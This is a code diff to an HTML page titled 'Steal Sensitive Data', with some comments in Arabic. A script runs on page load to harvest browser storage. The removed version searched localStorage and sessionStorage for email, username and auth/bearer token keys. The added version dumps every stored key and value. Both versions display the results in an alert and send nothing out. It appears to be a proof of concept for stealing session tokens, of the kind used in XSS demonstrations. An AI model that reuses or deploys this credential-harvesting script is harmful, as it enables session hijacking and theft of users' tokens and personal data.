@@ -4,38 +4,25 @@
   <title>Steal Sensitive Data</title>
   <script>
     window.onload = function() {
-      try {
-        // هنا نعرف المفاتيح اللي بنبحث عنها تحديدًا
-        const keysOfInterest = ['email', 'user', 'username', 'token', 'auth', 'bearer'];
+  try {
+    let allData = {};
 
-        // وظيفة تساعدنا نجيب القيمة من localStorage أو sessionStorage
-        function findKey(keys) {
-          for (const key of keys) {
-            let val = localStorage.getItem(key);
-            if (val) return {key, val, source: 'localStorage'};
+    for (let i = 0; i < localStorage.length; i++) {
+      let key = localStorage.key(i);
+      allData[`localStorage:${key}`] = localStorage.getItem(key);
+    }
 
-            val = sessionStorage.getItem(key);
-            if (val) return {key, val, source: 'sessionStorage'};
-          }
-          return null;
-        }
+    for (let i = 0; i < sessionStorage.length; i++) {
+      let key = sessionStorage.key(i);
+      allData[`sessionStorage:${key}`] = sessionStorage.getItem(key);
+    }
 
-        // نحاول نجيب أول قيمة موجودة من المفاتيح دي
-        const emailData = findKey(keysOfInterest.filter(k => k.includes('email')));
-        const userData = findKey(keysOfInterest.filter(k => k.includes('user')));
-        const tokenData = findKey(keysOfInterest.filter(k => ['token','auth','bearer'].includes(k)));
+    alert(JSON.stringify(allData, null, 2));
+  } catch(e) {
+    alert('Error: ' + e.message);
+  }
+};
 
-        // نعرض النتائج في alert
-        alert(`
-📧 Email: ${emailData ? emailData.val : 'Not found'}
-👤 User: ${userData ? userData.val : 'Not found'}
-🔑 Token: ${tokenData ? tokenData.val : 'Not found'}
-        `);
-
-      } catch (e) {
-        alert('Error: ' + e.message);
-      }
-    };
   </script>
 </head>
 <body>
